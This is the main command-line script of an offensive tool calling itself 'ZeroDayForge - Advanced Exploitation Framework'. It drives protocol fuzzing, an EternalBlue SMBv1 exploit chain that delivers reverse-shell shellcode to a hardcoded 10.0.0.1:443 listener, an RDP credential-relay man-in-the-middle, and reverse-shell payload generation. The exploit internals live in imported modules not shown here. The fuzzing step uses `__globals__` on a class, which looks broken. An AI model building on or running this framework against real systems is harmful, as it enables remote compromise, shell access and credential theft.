#!/usr/bin/env python3
"""
ZeroDayForge - Advanced Exploitation Framework
"""

import argparse
import logging
import sys
import shutil
from pyfiglet import Figlet
from termcolor import cprint

from core import ProtocolFuzzer, Win32HeapExploit, KerberosForge, SyscallDispatcher
from protocols import SMBExploiter

# Optional imports with failover
try:
	from protocols import RDPMitM
except ImportError:
	RDPMitM = None

try:
	from protocols import DNSExploit
except ImportError:
	DNSExploit = None

from payloads import ShellcodeGenerator, ProcessInjector

VERSION = "1.0.0"

def render_banner(text="ZeroDayForge", color="cyan", font="slant"):
	width = shutil.get_terminal_size((80, 20)).columns
	figlet = Figlet(font=font, width=width)
	banner = figlet.renderText(text)
	for line in banner.splitlines():
		cprint(line.center(width), color)

# Dynamically build available exploits
EXPLOIT_MAP = {
	'eternalblue': ('SMBv1 Exploit Chain', SMBExploiter)
}
if RDPMitM:
	EXPLOIT_MAP['rdp-mitm'] = ('RDP Credential Relay', RDPMitM)
if DNSExploit:
	EXPLOIT_MAP['dns-poison'] = ('DNS Cache Poisoning', DNSExploit)

def setup_logging(debug=False):
	level = logging.DEBUG if debug else logging.INFO
	logging.basicConfig(
		format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
		level=level
	)

def print_capabilities():
	print("Available Exploits:")
	for name, (desc, _) in EXPLOIT_MAP.items():
		print(f"  {name:<12} {desc}")
	
	print("\nSupported Protocols:")
	print("  smb, rdp, dns")
	
	print("\nPayload Types:")
	print("  shellcode, dll, ps1")

def main():
	parser = argparse.ArgumentParser(
		prog="zerodayforge",
		description="ZeroDayForge: Advanced Exploitation Framework",
		formatter_class=argparse.RawTextHelpFormatter
	)
	parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output')
	subparsers = parser.add_subparsers(dest='command', required=True)

	# Fuzzer subcommand
	fuzz_parser = subparsers.add_parser('fuzz', help='Protocol fuzzing operations')
	fuzz_parser.add_argument('-t', '--target', required=True, help='Target in IP:PORT format')
	fuzz_parser.add_argument('-p', '--protocol', choices=['smb', 'rdp', 'dns'], required=True, help='Target protocol')

	# Exploit subcommand
	exploit_parser = subparsers.add_parser('exploit', help='Launch specific exploits')
	exploit_parser.add_argument('-t', '--target', required=True, help='Target in IP:PORT format')
	exploit_parser.add_argument('-e', '--exploit', choices=EXPLOIT_MAP.keys(), required=True, help='Exploit to execute')

	# Payload subcommand
	payload_parser = subparsers.add_parser('payload', help='Payload generation')
	payload_parser.add_argument('-t', '--type', choices=['shellcode', 'dll', 'ps1'], required=True, help='Payload type')
	payload_parser.add_argument('-o', '--output', required=True, help='Output file path')
	payload_parser.add_argument('-l', '--lhost', help='Listener IP for reverse shells')
	payload_parser.add_argument('-p', '--lport', type=int, help='Listener port for reverse shells')

	# List subcommand
	list_parser = subparsers.add_parser('list', help='List framework capabilities')
	list_parser.add_argument('--exploits', action='store_true', help='List available exploits')
	list_parser.add_argument('--protocols', action='store_true', help='List supported protocols')
	list_parser.add_argument('--payloads', action='store_true', help='List payload types')

	args = parser.parse_args()
	setup_logging(args.debug)

	render_banner()
	print(f"Version {VERSION}\n")

	try:
		if args.command == 'list':
			if not any([args.exploits, args.protocols, args.payloads]):
				print_capabilities()
			else:
				if args.exploits: 
					print("Available exploits:", ", ".join(EXPLOIT_MAP.keys()))
				if args.protocols: 
					print("Supported protocols: smb, rdp, dns")
				if args.payloads: 
					print("Payload types: shellcode, dll, ps1")
			return

		if args.command == 'fuzz':
			target_ip, port = args.target.split(':', 1)
			proto_enum = getattr(ProtocolFuzzer.__globals__['Protocol'], args.protocol.upper())
			fuzzer = ProtocolFuzzer(target_ip, int(port), proto_enum)
			crash_points = fuzzer.fuzz(iterations=1000)
			logging.info(f"Found {len(crash_points)} potential crash points")

		elif args.command == 'exploit':
			target_ip, port = args.target.split(':', 1)
			exploit_name = args.exploit
			exploit_class = EXPLOIT_MAP[exploit_name][1]

			if not exploit_class:
				logging.error(f"Exploit '{exploit_name}' is not supported in this environment.")
				return
			
			if exploit_name == 'eternalblue':
				exploiter = exploit_class(target_ip)
				sc = ShellcodeGenerator().generate_reverse_shell("10.0.0.1", 443)
				success = exploiter.eternal_blue_chain(sc)
				if success:
					logging.info("EternalBlue exploit completed successfully")

			elif exploit_name == 'rdp-mitm':
				mitm = exploit_class(int(port))
				mitm.start_relay(("legit-server.com", 3389))
				logging.info("RDP MITM relay active on port %s", port)

		elif args.command == 'payload':
			generator = ShellcodeGenerator()
			if not args.lhost or not args.lport:
				logging.error("Missing LHOST/LPORT for payload generation")
				return

			if args.type == 'shellcode':
				sc = generator.generate_reverse_shell(args.lhost, args.lport)
				with open(args.output, 'wb') as f:
					f.write(sc)
				logging.info("Shellcode written to %s", args.output)

	except Exception as e:
		logging.error("Operation failed: %s", str(e), exc_info=args.debug)
		sys.exit(1)

if __name__ == "__main__":
	main()
